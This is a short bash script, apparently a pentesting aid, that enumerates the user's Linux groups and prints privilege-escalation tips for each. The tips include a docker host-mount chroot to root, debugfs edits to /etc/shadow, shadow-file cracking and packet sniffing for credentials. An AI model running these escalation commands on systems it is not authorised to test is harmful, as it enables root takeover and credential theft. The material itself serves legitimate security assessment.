#!/usr/bin/env bash
# group-enum.sh — privesc-via-group membership.
set -u
GROUPS_OUT=$(id -nG 2>/dev/null)
echo "Groups: $GROUPS_OUT"
echo

declare -A NOTES=(
    [docker]="docker run -v /:/mnt --rm -it alpine chroot /mnt -> root"
    [lxd]="see https://github.com/initstring/lxd_root — image import + privileged container"
    [lxc]="same as lxd vector"
    [disk]="debugfs -w /dev/sda1, edit /etc/passwd or /etc/shadow directly"
    [video]="cat /dev/fb0 > /tmp/screen.raw — screen capture (info disclosure)"
    [adm]="read /var/log/auth.log, /var/log/syslog — creds in plain-text rare but valuable"
    [shadow]="read /etc/shadow directly — offline crack"
    [systemd-journal]="journalctl access — sometimes secrets logged"
    [kvm]="/dev/kvm — guest VM escape research"
    [vboxusers]="VirtualBox guest control — depends on host config"
    [wireshark]="raw packet capture — credential sniffing"
    [pcap]="raw packet capture"
    [tape]="/dev/tape — backup media (info disclosure)"
    [bluetooth]="bluetoothctl — local-only typically"
)

for g in $GROUPS_OUT; do
    if [ -n "${NOTES[$g]:-}" ]; then
        printf "\033[1;32m[+] %s\033[0m — %s\n" "$g" "${NOTES[$g]}"
    fi
done

echo
echo "=== /etc/group entries with our user / 'sudo' / 'wheel' ==="
USER=$(id -un)
grep -E "(^|:)(${USER}|sudo|wheel|admin|root)(,|:|$)" /etc/group 2>/dev/null
